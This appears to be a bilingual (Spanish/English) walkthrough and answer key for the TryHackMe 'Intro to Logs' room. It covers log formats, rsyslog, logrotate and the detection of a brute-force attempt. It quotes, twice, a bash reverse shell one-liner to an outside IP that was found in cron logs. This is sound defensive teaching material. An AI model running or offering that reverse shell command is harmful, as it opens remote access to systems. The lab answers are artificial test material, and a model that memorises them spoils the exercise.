# Intro to Logs

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Easy | walkthrough | `introtologs` | [TryHackMe](https://tryhackme.com/room/introtologs) | 01 Level Easy | TryHackMe | Logs, GitLab, nginx, rsyslog, logrotate, Reverse Shell, Normalisation, Enrichment | Fundamentos de logging: tipos y formatos de logs, recopilación con rsyslog, rotación con logrotate, detección de una reverse shell y normalización/enriquecimiento |

> **Objeto:** Aprender los fundamentos del logging y del análisis de logs con un escenario real: localizar el log correcto, conocer tipos y formatos de log, configurar la recopilación con rsyslog, revisar la rotación con logrotate, detectar actividad maliciosa (brute force y reverse shell) y entender la normalización y el enriquecimiento.

---

**Contexto:** Sala del path SOC Level 2 con un escenario real de SwiftSpend Financial: un compañero (Perry) deja una nota indicando el log inicial a investigar. Se aprenden los tipos y formatos de logs web (Web Server Log / Combined), se configura rsyslog para centralizar logs de sshd y cron, se detecta un brute forcing (usuario stansimon), la IP del atacante y una reverse shell lanzada por root, se revisa la configuración de logrotate (frecuencia y copias), y se trabajan los conceptos de normalización y enriquecimiento de logs en el visor.

> **ES:** Sala de fundamentos de logs: GitLab/nginx, tipos y formatos, rsyslog, logrotate, detección de una reverse shell y conceptos de normalización y enriquecimiento.
> **EN:** Fundamentals of logging room: GitLab/nginx, log types and formats, rsyslog, logrotate, reverse shell detection and normalisation/enrichment concepts.

## Solucionario

### Task 1: Introducción / Introduction
**Explicación:** Presentación de la sala y del escenario: un incidente en SwiftSpend Financial y la necesidad de analizar los logs para entender qué ha hecho el adversario.

No answer needed

### Task 2: Expandiendo perspectivas / Expanding Perspectives: Logs as Evidence of Historical Activity
**Explicación:** Se lee la nota de Perry, que identifica el log inicial a investigar y su ruta completa en el servidor.

1. Perry
2. /var/log/gitlab/nginx/access.log

### Task 3: Tipos y formatos de logs / Log Types and Formats
**Explicación:** Se aprenden los tipos de logs y los formatos de los logs web: el log del servidor web y el formato Combined (extensión del CLF con referrer y user agent), usado por defecto por Nginx.

1. Web Server Log
2. Combined

### Task 4: Recopilación de logs / Log Collection
**Explicación:** Se configura rsyslog para centralizar los mensajes de sshd y cron. En los logs de sshd aparece el usuario stansimon realizando intentos fallidos (brute forcing), en la configuración de cron se identifica la IP de SIEM-02 y en el log de cron se ve la reverse shell ejecutada por root.

1. stansimon
2. 10.10.10.101
3. /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"

### Task 5: Gestión y centralización de logs / Log Management and Centralisation
**Explicación:** Se revisa la configuración de logrotate para el log de cron: cuántas copias comprimidas antiguas se conservan (24) y cuál es la frecuencia de rotación (hourly).

1. 24
2. hourly

### Task 6: Análisis y visualización de logs / Log Analysis and Visualisation
**Explicación:** En el visor de logs sin parsear, el log de cron muestra el error de campo de fecha ausente. Se aprenden los conceptos de normalización (estandarizar los datos parseados) y enriquecimiento (consolidar logs normalizados para enriquecer el análisis de actividad relacionada con una IP).

1. No date field
2. Normalisation
3. Enrichment

### Task 7: Conclusión / Conclusion
**Explicación:** Cierre de la sala.

No answer needed

### Tabla unificada de preguntas y respuestas

| Task | Pregunta | Respuesta |
|------|----------|-----------|
| 1 | Introducción a la sala | `No answer needed` |
| 2.1 | Nombre del compañero que dejó una nota en el escritorio | `Perry` |
| 2.2 | Ruta completa del log sugerido para la investigación inicial | `/var/log/gitlab/nginx/access.log` |
| 3.1 | Tipo de log usado por el fichero de la nota de la Task 2 | `Web Server Log` |
| 3.2 | Formato de log usado por el fichero de la nota de la Task 2 | `Combined` |
| 4.1 | Usuario que aparece repetidamente en los logs de sshd indicando brute forcing | `stansimon` |
| 4.2 | IP de SIEM-02 según la configuración de rsyslog para cron | `10.10.10.101` |
| 4.3 | Comando ejecutado por root según los logs de cron | `/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"` |
| 5.1 | Número de copias comprimidas antiguas que se conservan | `24` |
| 5.2 | Frecuencia de rotación del log | `hourly` |
| 6.1 | Error mostrado al seleccionar los filtros para el log de cron | `No date field` |
| 6.2 | Proceso de estandarizar los datos parseados en un formato legible y consultable | `Normalisation` |
| 6.3 | Proceso de consolidar logs normalizados para enriquecer el análisis por IP | `Enrichment` |
| 7 | Cierre de la sala | `No answer needed` |

---

**Metodología:** Lectura de la nota de Perry para localizar el log inicial, identificación del tipo y formato de log web, configuración de rsyslog para sshd y cron, análisis de los logs centralizados (detección del brute forcing con el usuario stansimon, la IP del atacante y la reverse shell), revisión de la configuración de logrotate y trabajo con el visor de logs para aplicar normalización y enriquecimiento.

### Cadena de ataque / Attack Chain

Nota de Perry -> acceso al log de GitLab/nginx -> identificación de formato -> configuración rsyslog -> detección de brute force (stansimon) -> reverse shell de root -> análisis de rotación (logrotate) -> normalización y enriquecimiento -> comprensión completa del incidente

**Learning chain:** logs -> GitLab/nginx -> log types and formats -> rsyslog collection -> brute force detection -> reverse shell -> logrotate -> normalisation -> enrichment

**Lección:** *Entender dónde viven los logs, cómo se recopilan y rotan, y cómo normalizarlos y enriquecerlos convierte los registros en la principal fuente de evidencia para reconstruir un incidente.*

**MITRE ATT&CK:** T1110 (Brute Force) / T1059.004 (Unix Shell).

**Fuente:** [TryHackMe - Intro to Logs](https://tryhackme.com/room/introtologs)

---

## Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.